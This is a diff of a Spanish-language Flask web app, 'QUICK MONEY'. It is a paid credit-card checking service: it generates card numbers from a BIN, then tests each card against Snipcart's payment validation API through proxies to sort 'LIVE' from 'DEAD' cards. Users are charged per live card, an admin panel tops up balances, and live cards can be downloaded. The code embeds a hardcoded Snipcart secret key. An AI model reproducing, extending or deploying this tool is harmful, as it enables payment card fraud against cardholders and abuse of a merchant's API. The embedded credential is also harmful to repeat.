@@ -3,7 +3,7 @@ from flask import Flask, render_template_string, request, redirect, session, url
 from pymongo import MongoClient
 
 app = Flask(__name__)
-app.secret_key = 'quick_money_v38_eternal_fixed'
+app.secret_key = 'quick_money_v39_final_elite'
 
 # --- CONFIGURACIÓN MAESTRA ---
 SNIPCART_SECRET = "ST_MDM2YTJlNjItNjBmYi00N2IyLWFjYWMtNDBkYjZmN2M2ODUzNjM5MDkwMzU3MzkyMjQ1NjA3"
@@ -24,7 +24,7 @@ except Exception as e:
 
 COSTO_LIVE = 0.15
 
-# --- MOTOR DE VALIDACIÓN ---
+# --- MOTOR DE VALIDACIÓN REAL ---
 def check_gate_pro(cc):
     try:
         partes = cc.split('|')
@@ -33,9 +33,7 @@ def check_gate_pro(cc):
         auth_str = base64.b64encode(f"{SNIPCART_SECRET}:".encode()).decode()
         headers = {"Authorization": f"Basic {auth_str}", "Content-Type": "application/json"}
         payload = {"paymentMethod": "CreditCard", "card": {"number": num, "expiryMonth": int(mes), "expiryYear": int(ano), "cvv": cvv}}
-        
         response = requests.post('https://app.snipcart.com/api/paymentmethods/validate', json=payload, headers=headers, proxies=PROXIES_CONFIG, timeout=15)
-        
         if response.status_code == 200:
             return {"status": "LIVE", "msg": "AUTHORIZED"}
         else:
@@ -47,27 +45,70 @@ def check_gate_pro(cc):
 CSS = """
 <style>
     @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap');
-    :root { --gold: #c5a059; --bg: #000; --card: rgba(8, 8, 10, 0.98); --border: #1a1a1e; --green: #2ecc71; --red: #ff4757; }
-    body { background: var(--bg); color: #fff; font-family: 'JetBrains Mono', monospace; margin: 0; padding: 10px; overflow-x: hidden; }
-    #bg-canvas { position: fixed; top:0; left:0; width:100%; height:100%; z-index: -1; opacity: 0.5; }
-    .container { max-width: 500px; margin: auto; padding-bottom: 50px; position: relative; z-index: 10; }
+    :root { --gold: #c5a059; --bg: #000; --card: rgba(10, 10, 12, 0.95); --border: #1a1a1e; --green: #2ecc71; --red: #ff4757; }
+    body { background: var(--bg); color: #fff; font-family: 'JetBrains Mono', monospace; margin: 0; padding: 0; min-height: 100vh; overflow-x: hidden; }
+    #bg-canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1; pointer-events: none; }
+    .container { max-width: 480px; margin: auto; padding: 20px; position: relative; z-index: 10; }
     .card { background: var(--card); border: 1px solid var(--border); padding: 25px; margin-bottom: 15px; border-radius: 4px; backdrop-filter: blur(10px); }
     .card-h { font-size: 11px; color: var(--gold); text-transform: uppercase; font-weight: bold; border-bottom: 1px solid var(--border); padding-bottom: 10px; margin-bottom: 15px; display: block; letter-spacing: 2px; }
-    .admin-card { border: 1px solid var(--gold); background: rgba(197, 160, 89, 0.05); }
-    input, textarea { width: 100%; background: #000; border: 1px solid var(--border); color: #fff; padding: 15px; margin-bottom: 12px; box-sizing: border-box; font-family: inherit; font-size: 13px; outline: none; }
+    input, textarea { width: 100%; background: #050505; border: 1px solid var(--border); color: #fff; padding: 15px; margin-bottom: 12px; box-sizing: border-box; font-family: inherit; font-size: 13px; outline: none; }
     .btn { border: none; padding: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 11px; width: 100%; transition: 0.2s; font-family: inherit; border-radius: 2px; }
     .btn-gold { background: var(--gold); color: #000; }
-    .btn-dark { background: #0a0a0a; color: #fff; border: 1px solid #1a1a1e; margin-top: 5px; }
-    .btn-mini { padding: 7px 12px; width: auto; font-size: 9px; margin-top: 0; }
-    .res-box { border-radius: 2px; padding: 12px; font-size: 11px; min-height: 100px; border: 1px solid #1a1a1e; background: #030303; overflow-y: auto; max-height: 250px; }
-    .live-item { border-bottom: 1px solid #111; padding: 10px 0; color: var(--green); }
+    .btn-dark { background: #0a0a0a; color: #fff; border: 1px solid #1a1a1e; }
+    .btn-mini { padding: 6px 10px; width: auto; font-size: 9px; margin: 5px 0; }
+    .res-box { border-radius: 2px; padding: 12px; font-size: 11px; min-height: 100px; border: 1px solid #1a1a1e; background: #030303; overflow-y: auto; max-height: 250px; margin-bottom: 10px; }
+    .user-list { font-size: 10px; color: #888; text-align: left; max-height: 100px; overflow-y: auto; background: #050505; padding: 10px; border: 1px solid #1a1a1e; }
 </style>
+"""
+
+CANVAS_JS = """
+<script>
+    const canvas = document.getElementById('bg-canvas');
+    const ctx = canvas.getContext('2d');
+    let particles = [];
+    function init() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+    window.addEventListener('resize', init);
+    init();
+    class P {
+        constructor() {
+            this.x = Math.random() * canvas.width;
+            this.y = Math.random() * canvas.height;
+            this.size = Math.random() * 1.5 + 0.5;
+            this.speedX = Math.random() * 1 - 0.5;
+            this.speedY = Math.random() * 1 - 0.5;
+        }
+        update() {
+            this.x += this.speedX;
+            this.y += this.speedY;
+            if (this.x > canvas.width) this.x = 0;
+            if (this.x < 0) this.x = canvas.width;
+            if (this.y > canvas.height) this.y = 0;
+            if (this.y < 0) this.y = canvas.height;
+        }
+        draw() {
+            ctx.fillStyle = 'rgba(197, 160, 89, 0.4)';
+            ctx.beginPath();
+            ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+            ctx.fill();
+        }
+    }
+    for (let i = 0; i < 80; i++) particles.push(new P());
+    function animate() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        particles.forEach(p => { p.update(); p.draw(); });
+        requestAnimationFrame(animate);
+    }
+    animate();
+</script>
 """
 
 @app.route('/')
 def login():
     if 'user' in session: return redirect(url_for('panel'))
-    return render_template_string(f'<html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head><body><canvas id="bg-canvas"></canvas><div style="display:flex;align-items:center;justify-content:center;height:100vh;"><div class="card" style="width:340px; text-align:center;"><h2>QUICK MONEY</h2><form method="POST" action="/auth"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><button class="btn btn-gold">INGRESAR</button></form><br><a href="/register" style="color:var(--gold); font-size:10px; text-decoration:none;">[ CREAR CUENTA ]</a></div></div></body></html>')
+    return render_template_string(f'<html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head><body><canvas id="bg-canvas"></canvas><div style="display:flex;align-items:center;justify-content:center;height:100vh;position:relative;z-index:10;"><div class="card" style="width:340px; text-align:center;"><h2 style="letter-spacing:2px; font-size:18px;">⚡️🌩️ QUICK MONEY 🌩️⚡️</h2><span style="color:var(--gold); font-size:10px;">{{ CHK }}</span><br><br><form method="POST" action="/auth"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><button class="btn btn-gold">INGRESAR</button></form><br><a href="/register" style="color:var(--gold); font-size:10px; text-decoration:none;">[ CREAR CUENTA ]</a></div></div>{CANVAS_JS}</body></html>')
 
 @app.route('/register', methods=['GET', 'POST'])
 def register():
@@ -76,89 +117,83 @@ def register():
         if not usuarios_col.find_one({"u": u}):
             usuarios_col.insert_one({"u": u, "p": p, "saldo": 0.0, "rango": "USER", "telegram": t})
             return redirect(url_for('login'))
-    return render_template_string(f'<html><head>{CSS}</head><body><div style="display:flex;align-items:center;justify-content:center;height:100vh;"><div class="card" style="width:340px; text-align:center;"><h2>REGISTRO</h2><form method="POST"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><input name="t" placeholder="TELEGRAM @ID"><button class="btn btn-gold">REGISTRAR</button></form></div></div></body></html>')
+    return render_template_string(f'<html><head>{CSS}</head><body><canvas id="bg-canvas"></canvas><div style="display:flex;align-items:center;justify-content:center;height:100vh;position:relative;z-index:10;"><div class="card" style="width:340px; text-align:center;"><h2>REGISTRO</h2><form method="POST"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><input name="t" placeholder="TELEGRAM @ID"><button class="btn btn-gold">REGISTRAR</button></form></div></div>{CANVAS_JS}</body></html>')
 
 @app.route('/panel', methods=['GET', 'POST'])
 def panel():
     if 'user' not in session: return redirect(url_for('login'))
-    u_name = session['user']
-    u_data = usuarios_col.find_one({"u": u_name})
-    is_admin = u_name.lower() == "mairo"
-    display_id = "ADMIN" if is_admin else u_name.upper()
+    u_data = usuarios_col.find_one({"u": session['user']})
+    is_admin = session['user'].lower() == "mairo"
+    
+    all_users = ""
+    if is_admin:
+        users = usuarios_col.find({}, {"u": 1, "telegram": 1, "saldo": 1})
+        all_users = "".join([f"• {u['u']} (@{u.get('telegram','?')}) - ${u['saldo']}<br>" for u in users])
 
     return render_template_string(f"""
     <html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head>
     <body><canvas id="bg-canvas"></canvas><div class="container">
-        <div style="display:flex; justify-content:space-between; align-items:center; margin: 30px 0;">
-            <div style="font-size:11px;">ID: <b style="color:var(--gold)">{display_id}</b></div>
-            <div id="display_saldo" style="border:1px solid var(--gold); padding:8px 15px; color:var(--gold); font-weight:bold;">${u_data['saldo']:.2f}</div>
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 20px;">
+            <div style="font-size:11px; letter-spacing:1px;">ID: <b style="color:var(--gold)">{"ADMIN" if is_admin else session['user'].upper()}</b></div>
+            <div style="border:1px solid var(--gold); padding:8px 15px; color:var(--gold); font-weight:bold;">${u_data['saldo']:.2f}</div>
         </div>
 
-        {" " if not is_admin else f'''
-        <div class="card admin-card"><span class="card-h" style="color:var(--gold)">👑 CONTROL DE MANDO (ADMIN)</span>
+        {f'''<div class="card" style="border:1px solid var(--gold)"><span class="card-h">👑 GESTIÓN DE CLIENTES</span>
+            <div class="user-list">{all_users}</div><br>
             <form action="/admin_add_saldo" method="POST">
-                <input name="target_user" placeholder="USUARIO A RECARGAR">
+                <input name="target_user" placeholder="USUARIO">
                 <input name="amount" type="number" step="0.01" placeholder="CANTIDAD $">
-                <button type="submit" class="btn btn-gold" style="padding:10px;">AÑADIR SALDO</button>
-            </form>
-        </div>
-        '''}
-        
+                <button type="submit" class="btn btn-gold" style="padding:12px;">CARGAR SALDO</button>
+            </form></div>''' if is_admin else ""}
+
         <div class="card"><span class="card-h">🪄 GENERADOR ÉLITE</span>
-            <input id="bin_val" placeholder="BIN">
+            <input id="bin_val" placeholder="BIN (6 DÍGITOS)">
             <button class="btn btn-dark" onclick="generarCC()">GENERAR</button>
             <textarea id="gen_area" rows="3" readonly style="margin-top:10px; color:var(--gold); font-size:11px;"></textarea>
-            <button class="btn btn-dark btn-mini" onclick="document.getElementById('check_list').value += document.getElementById('gen_area').value + '\\n'">➕ CARGAR</button>
+            <button class="btn btn-dark btn-mini" onclick="document.getElementById('check_list').value += document.getElementById('gen_area').value + '\\n'">➕ CARGAR AL VALIDADOR</button>
         </div>
 
-        <div class="card"><span class="card-h">🛡️ GATE PRO (REAL BANK)</span>
-            <textarea id="check_list" rows="6" placeholder="LISTA CC|MM|YY|CVV"></textarea>
-            <button class="btn btn-gold" id="btn_start" onclick="startChecking()">🚀 INICIAR ($0.15)</button>
+        <div class="card"><span class="card-h">🛡️ GATE PRO (REAL)</span>
+            <textarea id="check_list" rows="5" placeholder="CC|MM|YY|CVV"></textarea>
+            <button class="btn btn-gold" id="btn_start" onclick="startChecking()">🚀 INICIAR CHECK ($0.15)</button>
         </div>
 
-        <div style="display:flex; justify-content:space-between; align-items:center;">
-            <span style="color:var(--green); font-size:10px;">LIVES ✅</span>
-            <button class="btn btn-dark btn-mini" onclick="downloadLives()">📥 DESCARGAR</button>
-        </div>
+        <div style="display:flex; justify-content:space-between; align-items:center;"><span style="color:var(--green); font-size:10px;">LIVES ✅</span><button class="btn btn-dark btn-mini" onclick="downloadLives()">📥 GUARDAR</button></div>
         <div class="res-box" id="lives_log"></div>
-        <div class="res-box" id="dead_log" style="opacity:0.5; margin-top:15px;"></div>
-
-        <a href="/logout" style="color:#444; text-decoration:none; display:block; text-align:center; margin-top:40px; font-size:10px;">[ CERRAR SESIÓN ]</a>
-    </div>
+        <div class="res-box" id="dead_log" style="opacity:0.4;"></div>
+        <a href="/logout" style="color:#444; text-decoration:none; display:block; text-align:center; margin-top:30px; font-size:10px;">[ CERRAR SESIÓN ]</a>
+    </div>{CANVAS_JS}
     <script>
     function generarCC() {{
-        let bin = document.getElementById('bin_val').value;
-        let cards = [];
-        for(let i=0; i<10; i++) {{
-            let res = bin; while(res.length < 16) res += Math.floor(Math.random()*10);
-            cards.push(res + "|" + ("0" + (Math.floor(Math.random()*12) + 1)).slice(-2) + "|" + (2025 + Math.floor(Math.random()*6)) + "|" + Math.floor(Math.random()*899 + 100));
-        }}
-        document.getElementById('gen_area').value = cards.join('\\n');
+        let b = document.getElementById('bin_val').value; if(b.length<6) return alert("Bin inválido");
+        let c = []; for(let i=0;i<10;i++) {{
+            let r = b; while(r.length<16) r+=Math.floor(Math.random()*10);
+            c.push(r+"|"+("0"+(Math.floor(Math.random()*12)+1)).slice(-2)+"|"+(2025+Math.floor(Math.random()*6))+"|"+Math.floor(Math.random()*899+100));
+        }} document.getElementById('gen_area').value = c.join('\\n');
     }}
     async function startChecking() {{
-        let a = document.getElementById('check_list'); let l = a.value.trim().split('\\n');
-        if(!l[0]) return; document.getElementById('btn_start').disabled = true;
-        while(l.length > 0) {{
-            let cc = l.shift(); a.value = l.join('\\n');
+        let a = document.getElementById('check_list'); let lines = a.value.trim().split('\\n');
+        if(!lines[0]) return; document.getElementById('btn_start').disabled = true;
+        while(lines.length > 0) {{
+            let cc = lines.shift(); a.value = lines.join('\\n');
             let r = await fetch('/validar_card', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{card:cc}})}});
             let d = await r.json();
             if(d.status === 'LIVE') {{
-                document.getElementById('display_saldo').innerText = '$' + d.nuevo_saldo.toFixed(2);
-                document.getElementById('lives_log').innerHTML = '<div class="live-item">'+cc+' | '+d.msg+'</div>' + document.getElementById('lives_log').innerHTML;
+                document.getElementById('lives_log').innerHTML = '<div style="color:var(--green); padding:5px 0;">'+cc+' | AUTHORIZED</div>' + document.getElementById('lives_log').innerHTML;
             }} else {{
                 document.getElementById('dead_log').innerHTML = cc + ' | ' + d.msg + '<br>' + document.getElementById('dead_log').innerHTML;
             }}
             await new Promise(r => setTimeout(r, 1200));
-        }}
-        document.getElementById('btn_start').disabled = false;
+        }} document.getElementById('btn_start').disabled = false;
     }}
+    function downloadLives() {{ let d = document.getElementById('lives_log').innerText; if(!d) return; let blob = new Blob([d], {{type:'text/plain'}}); let a = document.createElement('a'); a.href=URL.createObjectURL(blob); a.download='lives.txt'; a.click(); }}
     </script></body></html>
     """)
 
 @app.route('/admin_add_saldo', methods=['POST'])
 def admin_add_saldo():
     if session.get('user', '').lower() != "mairo": return redirect(url_for('panel'))
-    target = request.form.get('target_user')
+    target = request.form.get('target_user').strip()
     amount = float(request.form.get('amount', 0))
     usuarios_col.update_one({"u": target}, {"$inc": {"saldo": amount}})
     return redirect(url_for('panel'))
@@ -172,7 +207,7 @@ def validar():
     if res['status'] == 'LIVE':
         new_s = round(u_data['saldo'] - COSTO_LIVE, 2)
         usuarios_col.update_one({"u": session['user']}, {"$set": {"saldo": new_s}})
-        return jsonify({"status": "LIVE", "nuevo_saldo": new_s, "msg": res['msg']})
+        return jsonify({"status": "LIVE", "nuevo_saldo": new_s})
     return jsonify({"status": "DEAD", "msg": res['msg']})
 
 @app.route('/auth', methods=['POST'])
